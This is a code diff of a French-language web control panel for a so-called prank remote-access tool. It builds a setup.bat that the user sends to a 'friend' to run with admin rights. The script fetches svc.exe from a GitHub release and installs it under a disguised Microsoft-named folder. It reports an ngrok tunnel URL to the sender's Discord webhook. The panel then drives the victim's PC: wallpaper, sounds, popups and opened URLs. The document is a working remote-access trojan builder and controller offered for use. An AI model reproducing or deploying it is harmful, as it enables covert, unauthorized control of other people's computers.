@@ -33,11 +33,33 @@
 
     header {
       text-align: center;
-      margin-bottom: 2.5rem;
+      margin-bottom: 2rem;
     }
     header h1 { font-size: 2rem; font-weight: 800; letter-spacing: -0.5px; }
     header h1 span { color: var(--accent); }
     header p { color: var(--muted); margin-top: .4rem; font-size: .9rem; }
+
+    /* ── Tabs ── */
+    .tabs {
+      display: flex;
+      gap: .5rem;
+      max-width: 1100px;
+      margin: 0 auto 2rem;
+    }
+    .tab-btn {
+      padding: .6rem 1.5rem;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: var(--surface);
+      color: var(--muted);
+      cursor: pointer;
+      font-size: .9rem;
+      font-weight: 600;
+      font-family: inherit;
+      transition: all .2s;
+    }
+    .tab-btn.active { background: var(--accent); color: #fff; border-color: var(--accent); }
+    .tab-btn:hover:not(.active) { border-color: var(--accent); color: var(--text); }
 
     /* ── Section titles ── */
     .section-title {
@@ -67,7 +89,7 @@
       border-radius: var(--radius);
       padding: 1.5rem;
       display: grid;
-      grid-template-columns: 1fr 1fr 1fr auto;
+      grid-template-columns: 1fr 1fr auto;
       gap: 1rem;
       align-items: end;
     }
@@ -94,13 +116,44 @@
       color: #93c5fd;
       word-break: break-all;
     }
-    .cmd-box.ready { border-color: #166534; }
-    .cmd-box.ready code { color: #86efac; }
+
+    /* ── Status + Target row ── */
+    .status-row {
+      max-width: 1100px;
+      margin: 0 auto 2rem;
+      display: grid;
+      grid-template-columns: 160px 1fr;
+      gap: 1rem;
+      align-items: stretch;
+    }
+    @media (max-width: 600px) { .status-row { grid-template-columns: 1fr; } }
+
+    .status-panel {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: .45rem;
+      padding: 1rem;
+      text-align: center;
+    }
+    .status-dot {
+      width: 18px; height: 18px;
+      border-radius: 50%;
+      background: var(--muted);
+      transition: background .3s, box-shadow .3s;
+      flex-shrink: 0;
+    }
+    .status-dot.ok  { background: var(--ok);  box-shadow: 0 0 10px var(--ok); }
+    .status-dot.err { background: var(--err); }
+    .status-label { font-size: .85rem; font-weight: 700; color: var(--text); }
+    .status-time  { font-size: .7rem; color: var(--muted); }
 
     /* ── Target URL ── */
     .target-box {
-      max-width: 1100px;
-      margin: 0 auto 2rem;
       background: var(--surface);
       border: 1px solid var(--border);
       border-radius: var(--radius);
@@ -115,9 +168,8 @@
       color: var(--muted);
       margin-bottom: .5rem;
     }
-    .target-row { display: flex; gap: .5rem; }
     .target-row input {
-      flex: 1;
+      width: 100%;
       background: var(--card);
       border: 1px solid var(--border);
       border-radius: 8px;
@@ -129,17 +181,6 @@
     }
     .target-row input:focus { border-color: var(--accent); }
     .target-row input::placeholder { color: var(--muted); }
-
-    .ping-dot {
-      width: 10px; height: 10px;
-      border-radius: 50%;
-      background: var(--muted);
-      flex-shrink: 0;
-      align-self: center;
-      transition: background .3s;
-    }
-    .ping-dot.ok  { background: var(--ok); box-shadow: 0 0 6px var(--ok); }
-    .ping-dot.err { background: var(--err); }
 
     /* ── Grid ── */
     .grid {
@@ -250,129 +291,154 @@
   <p>Controle a distance — entre amis uniquement</p>
 </header>
 
-<!-- ── SECTION 1 : Generateur ──────────────────────────────────────────────── -->
-<p class="section-title">Generer le fichier d'installation</p>
-
-<div class="generator-box">
-  <div class="field">
-    <label>Webhook Discord</label>
-    <input type="url" id="genWebhook" placeholder="https://discord.com/api/webhooks/..." oninput="updateCmd()" />
-  </div>
-  <div class="field">
-    <label>Authtoken ngrok</label>
-    <input type="password" id="genToken" placeholder="2abc..." oninput="updateCmd()" />
-  </div>
-  <div class="field" style="justify-content:flex-end">
-    <button class="btn green" id="dlBtn" onclick="downloadSetup()" disabled>⬇ Telecharger setup.bat</button>
-  </div>
+<!-- ── Onglets ──────────────────────────────────────────────────────────────── -->
+<div class="tabs">
+  <button class="tab-btn active" id="btn-install" onclick="switchTab('install')">Installation</button>
+  <button class="tab-btn"        id="btn-control" onclick="switchTab('control')">Controler une cible</button>
 </div>
 
-<div class="cmd-box" id="cmdBox" style="gap:1rem;flex-direction:column;align-items:flex-start">
-  <div style="font-size:.8rem;color:var(--muted);line-height:1.7">
-    <strong style="color:var(--text)">Comment l'utiliser :</strong><br>
-    1. Entre le webhook et le token, clique <em>Telecharger setup.ps1</em><br>
-    2. Envoie le fichier a ton ami (Discord, mail...)<br>
-    3. Ton ami : <strong style="color:var(--text)">double-clic sur setup.bat</strong> → accepte l'UAC<br>
-    4. L'URL ngrok apparait dans ton Discord
-  </div>
-</div>
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<!-- TAB 1 : Installation                                                       -->
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<div id="tab-install">
 
-<hr class="divider" />
+  <p class="section-title">Generer le fichier d'installation</p>
 
-<!-- ── SECTION 2 : Controle a distance ──────────────────────────────────── -->
-<p class="section-title">Controler une cible</p>
-
-<div class="target-box">
-  <label>URL de la cible (depuis Discord)</label>
-  <div class="target-row">
-    <input type="url" id="targetUrl" placeholder="https://xxxx-xx-xx-xx-xx.ngrok-free.app" />
-    <div class="ping-dot" id="pingDot" title="Statut de la connexion"></div>
-  </div>
-</div>
-
-<div class="grid">
-
-  <div class="card">
-    <div class="card-header">
-      <div class="card-icon">🖼️</div>
-      <div><div class="card-title">Fond d'ecran</div><div class="card-desc">Remplace le wallpaper</div></div>
+  <div class="generator-box">
+    <div class="field">
+      <label>Webhook Discord</label>
+      <input type="url" id="genWebhook" placeholder="https://discord.com/api/webhooks/..." oninput="updateCmd()" />
     </div>
     <div class="field">
-      <label>Image (JPG, PNG, BMP)</label>
-      <label class="file-label" for="wallpaperFile">
-        📁 Choisir une image
-        <input type="file" id="wallpaperFile" accept="image/*" />
-      </label>
-      <span class="file-name" id="wallpaperName">Aucun fichier</span>
+      <label>Authtoken ngrok</label>
+      <input type="password" id="genToken" placeholder="2abc..." oninput="updateCmd()" />
     </div>
-    <button class="btn" onclick="sendWallpaper()">Envoyer</button>
+    <div class="field" style="justify-content:flex-end">
+      <button class="btn green" id="dlBtn" onclick="downloadSetup()" disabled>⬇ Telecharger setup.bat</button>
+    </div>
   </div>
 
-  <div class="card">
-    <div class="card-header">
-      <div class="card-icon">🔊</div>
-      <div><div class="card-title">Audio</div><div class="card-desc">Joue un son sur le PC cible</div></div>
+  <div class="cmd-box" style="gap:1rem;flex-direction:column;align-items:flex-start">
+    <div style="font-size:.8rem;color:var(--muted);line-height:1.8">
+      <strong style="color:var(--text)">Comment l'utiliser :</strong><br>
+      1. Entre le webhook et le token, clique <em>Telecharger setup.bat</em><br>
+      2. Envoie le fichier a ton ami (Discord, mail...)<br>
+      3. Ton ami : <strong style="color:var(--text)">double-clic sur setup.bat</strong> → accepte l'UAC<br>
+      4. L'URL ngrok apparait dans ton Discord
     </div>
-    <div class="field">
-      <label>Fichier audio (MP3, WAV, OGG)</label>
-      <label class="file-label" for="audioFile">
-        📁 Choisir un fichier
-        <input type="file" id="audioFile" accept="audio/*" />
-      </label>
-      <span class="file-name" id="audioName">Aucun fichier</span>
-    </div>
-    <div class="field">
-      <label>Volume — <span id="volumeVal">100</span>%</label>
-      <input type="range" id="audioVolume" min="0" max="100" value="100"
-             oninput="document.getElementById('volumeVal').textContent=this.value"
-             style="width:100%;accent-color:var(--accent);cursor:pointer" />
-    </div>
-    <button class="btn" onclick="sendAudio()">Envoyer</button>
-  </div>
-
-  <div class="card">
-    <div class="card-header">
-      <div class="card-icon">💬</div>
-      <div><div class="card-title">Popup</div><div class="card-desc">Affiche une boite de dialogue</div></div>
-    </div>
-    <div class="field">
-      <label>Titre</label>
-      <input type="text" id="popupTitle" placeholder="Titre du message" value="Salut !" />
-    </div>
-    <div class="field">
-      <label>Message</label>
-      <textarea id="popupMessage" placeholder="Ton message ici...">Tu t'es fait avoir !</textarea>
-    </div>
-    <button class="btn" onclick="sendPopup()">Envoyer</button>
-  </div>
-
-  <div class="card">
-    <div class="card-header">
-      <div class="card-icon">🌐</div>
-      <div><div class="card-title">Ouvrir une URL</div><div class="card-desc">Ouvre un site dans le navigateur</div></div>
-    </div>
-    <div class="field">
-      <label>URL a ouvrir</label>
-      <input type="url" id="openUrl" placeholder="https://example.com" />
-    </div>
-    <button class="btn" onclick="sendUrl()">Envoyer</button>
   </div>
 
 </div>
 
-<hr class="divider" />
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<!-- TAB 2 : Controler une cible                                                -->
+<!-- ══════════════════════════════════════════════════════════════════════════ -->
+<div id="tab-control" style="display:none">
 
-<!-- ── SECTION 3 : Desinstallation ──────────────────────────────────────── -->
-<p class="section-title">Desinstaller sur un PC cible</p>
+  <p class="section-title">Controler une cible</p>
 
-<div class="cmd-box" style="flex-direction:column;align-items:flex-start;gap:.75rem">
-  <div style="font-size:.8rem;color:var(--muted)">
-    A executer sur le PC de la cible dans un PowerShell ouvert normalement :
+  <!-- Statut ngrok + URL cible -->
+  <div class="status-row">
+    <div class="status-panel">
+      <div class="status-dot" id="statusDot"></div>
+      <div class="status-label" id="statusLabel">Hors ligne</div>
+      <div class="status-time"  id="statusTime">—</div>
+    </div>
+    <div class="target-box">
+      <label>URL de la cible (depuis Discord)</label>
+      <div class="target-row">
+        <input type="url" id="targetUrl" placeholder="https://xxxx-xx-xx-xx-xx.ngrok-free.app"
+               oninput="onTargetInput()" />
+      </div>
+    </div>
   </div>
-  <div style="display:flex;align-items:center;gap:.75rem;width:100%">
-    <code id="uninstallCmd" style="flex:1;font-family:'Consolas',monospace;font-size:.8rem;color:#93c5fd;word-break:break-all">powershell -ep bypass -File "$env:LOCALAPPDATA\Microsoft\PyService\uninstall.ps1"</code>
-    <button class="btn" style="margin-top:0;padding:.5rem .9rem;font-size:.8rem;flex-shrink:0" onclick="copyUninstall()">Copier</button>
+
+  <!-- Actions -->
+  <div class="grid">
+
+    <div class="card">
+      <div class="card-header">
+        <div class="card-icon">🖼️</div>
+        <div><div class="card-title">Fond d'ecran</div><div class="card-desc">Remplace le wallpaper</div></div>
+      </div>
+      <div class="field">
+        <label>Image (JPG, PNG, BMP)</label>
+        <label class="file-label" for="wallpaperFile">
+          📁 Choisir une image
+          <input type="file" id="wallpaperFile" accept="image/*" />
+        </label>
+        <span class="file-name" id="wallpaperName">Aucun fichier</span>
+      </div>
+      <button class="btn" onclick="sendWallpaper()">Envoyer</button>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <div class="card-icon">🔊</div>
+        <div><div class="card-title">Audio</div><div class="card-desc">Joue un son sur le PC cible</div></div>
+      </div>
+      <div class="field">
+        <label>Fichier audio (MP3, WAV, OGG)</label>
+        <label class="file-label" for="audioFile">
+          📁 Choisir un fichier
+          <input type="file" id="audioFile" accept="audio/*" />
+        </label>
+        <span class="file-name" id="audioName">Aucun fichier</span>
+      </div>
+      <div class="field">
+        <label>Volume — <span id="volumeVal">100</span>%</label>
+        <input type="range" id="audioVolume" min="0" max="100" value="100"
+               oninput="document.getElementById('volumeVal').textContent=this.value"
+               style="width:100%;accent-color:var(--accent);cursor:pointer" />
+      </div>
+      <button class="btn" onclick="sendAudio()">Envoyer</button>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <div class="card-icon">💬</div>
+        <div><div class="card-title">Popup</div><div class="card-desc">Affiche une boite de dialogue</div></div>
+      </div>
+      <div class="field">
+        <label>Titre</label>
+        <input type="text" id="popupTitle" placeholder="Titre du message" value="Salut !" />
+      </div>
+      <div class="field">
+        <label>Message</label>
+        <textarea id="popupMessage" placeholder="Ton message ici...">Tu t'es fait avoir !</textarea>
+      </div>
+      <button class="btn" onclick="sendPopup()">Envoyer</button>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <div class="card-icon">🌐</div>
+        <div><div class="card-title">Ouvrir une URL</div><div class="card-desc">Ouvre un site dans le navigateur</div></div>
+      </div>
+      <div class="field">
+        <label>URL a ouvrir</label>
+        <input type="url" id="openUrl" placeholder="https://example.com" />
+      </div>
+      <button class="btn" onclick="sendUrl()">Envoyer</button>
+    </div>
+
   </div>
+
+  <hr class="divider" />
+
+  <!-- Desinstallation -->
+  <p class="section-title">Desinstaller sur un PC cible</p>
+
+  <div class="cmd-box" style="flex-direction:column;align-items:flex-start;gap:.75rem">
+    <div style="font-size:.8rem;color:var(--muted)">
+      A executer sur le PC de la cible dans un PowerShell ouvert normalement :
+    </div>
+    <div style="display:flex;align-items:center;gap:.75rem;width:100%">
+      <code id="uninstallCmd" style="flex:1;font-family:'Consolas',monospace;font-size:.8rem;color:#93c5fd;word-break:break-all">powershell -ep bypass -File "$env:LOCALAPPDATA\Microsoft\PyService\uninstall.ps1"</code>
+      <button class="btn" style="margin-top:0;padding:.5rem .9rem;font-size:.8rem;flex-shrink:0" onclick="copyUninstall()">Copier</button>
+    </div>
+  </div>
+
 </div>
 
 <div id="toast"></div>
@@ -380,16 +446,19 @@
 <script>
   const EXE_URL = 'https://github.com/lamziiii/prank-server/releases/latest/download/svc.exe';
 
+  // ── Tabs ─────────────────────────────────────────────────────────────────
+  function switchTab(name) {
+    document.getElementById('tab-install').style.display  = name === 'install' ? '' : 'none';
+    document.getElementById('tab-control').style.display  = name === 'control' ? '' : 'none';
+    document.getElementById('btn-install').classList.toggle('active', name === 'install');
+    document.getElementById('btn-control').classList.toggle('active', name === 'control');
+  }
+
+  // ── Installation ─────────────────────────────────────────────────────────
   function updateCmd() {
     const webhook = document.getElementById('genWebhook').value.trim();
     const token   = document.getElementById('genToken').value.trim();
-    const btn     = document.getElementById('dlBtn');
-    btn.disabled  = !(webhook && token);
-  }
-
-  function copyUninstall() {
-    const cmd = document.getElementById('uninstallCmd').textContent;
-    navigator.clipboard.writeText(cmd).then(() => toast('Commande copiee !'));
+    document.getElementById('dlBtn').disabled = !(webhook && token);
   }
 
   function downloadSetup() {
@@ -397,7 +466,6 @@
     const token   = document.getElementById('genToken').value.trim();
     if (!webhook || !token) return;
 
-    // Contenu PS1 ecrit ligne par ligne par le bat (evite les problemes de politique d'execution)
     const bat =
 `@echo off
 net session >nul 2>&1
@@ -416,43 +484,59 @@ del "%f%" 2>nul`;
     const blob = new Blob([bat], { type: 'text/plain' });
     const url  = URL.createObjectURL(blob);
     const a    = document.createElement('a');
-    a.href     = url;
-    a.download = 'setup.bat';
-    a.click();
+    a.href = url; a.download = 'setup.bat'; a.click();
     URL.revokeObjectURL(url);
     toast('setup.bat telecharge !');
   }
 
-  // ── File input labels ────────────────────────────────────────────────────
-  document.getElementById('wallpaperFile').addEventListener('change', e => {
-    document.getElementById('wallpaperName').textContent = e.target.files[0]?.name || 'Aucun fichier';
-  });
-  document.getElementById('audioFile').addEventListener('change', e => {
-    document.getElementById('audioName').textContent = e.target.files[0]?.name || 'Aucun fichier';
-  });
-
-  // ── Ping cible ───────────────────────────────────────────────────────────
+  // ── Statut ngrok ─────────────────────────────────────────────────────────
   let pingTimer;
-  document.getElementById('targetUrl').addEventListener('input', () => {
+
+  function onTargetInput() {
     clearTimeout(pingTimer);
+    setStatus('pending');
     pingTimer = setTimeout(pingTarget, 600);
-  });
+  }
+
+  function setStatus(state) {
+    const dot   = document.getElementById('statusDot');
+    const label = document.getElementById('statusLabel');
+    const time  = document.getElementById('statusTime');
+    if (state === 'ok') {
+      dot.className   = 'status-dot ok';
+      label.textContent = 'En ligne';
+      const now = new Date();
+      time.textContent  = now.toLocaleTimeString('fr-FR');
+    } else if (state === 'err') {
+      dot.className   = 'status-dot err';
+      label.textContent = 'Hors ligne';
+      time.textContent  = '—';
+    } else {
+      dot.className   = 'status-dot';
+      label.textContent = '...';
+      time.textContent  = '';
+    }
+  }
 
   async function pingTarget() {
-    const dot = document.getElementById('pingDot');
     const url = getTarget();
-    if (!url) { dot.className = 'ping-dot'; return; }
+    if (!url) { setStatus('err'); return; }
     try {
       await fetch(url + '/popup', { method: 'OPTIONS', mode: 'cors', signal: AbortSignal.timeout(4000) });
-      dot.className = 'ping-dot ok';
+      setStatus('ok');
     } catch {
-      dot.className = 'ping-dot err';
+      setStatus('err');
     }
   }
 
   // ── Helpers ──────────────────────────────────────────────────────────────
   function getTarget() {
     return document.getElementById('targetUrl').value.trim().replace(/\/$/, '');
+  }
+
+  function copyUninstall() {
+    navigator.clipboard.writeText(document.getElementById('uninstallCmd').textContent)
+      .then(() => toast('Commande copiee !'));
   }
 
   function toast(msg, type = 'ok') {
@@ -469,7 +553,7 @@ del "%f%" 2>nul`;
     const opts = { method: 'POST', body };
     if (!isFormData) opts.headers = { 'Content-Type': 'application/json' };
     try {
-      const r = await fetch(url + path, opts);
+      const r    = await fetch(url + path, opts);
       const json = await r.json();
       if (r.ok) toast('OK !');
       else toast('Erreur : ' + (json.error || r.status), 'err');
@@ -477,6 +561,14 @@ del "%f%" 2>nul`;
       toast('Impossible de joindre la cible.', 'err');
     }
   }
+
+  // ── File input labels ────────────────────────────────────────────────────
+  document.getElementById('wallpaperFile').addEventListener('change', e => {
+    document.getElementById('wallpaperName').textContent = e.target.files[0]?.name || 'Aucun fichier';
+  });
+  document.getElementById('audioFile').addEventListener('change', e => {
+    document.getElementById('audioName').textContent = e.target.files[0]?.name || 'Aucun fichier';
+  });
 
   // ── Actions ──────────────────────────────────────────────────────────────
   function sendWallpaper() {
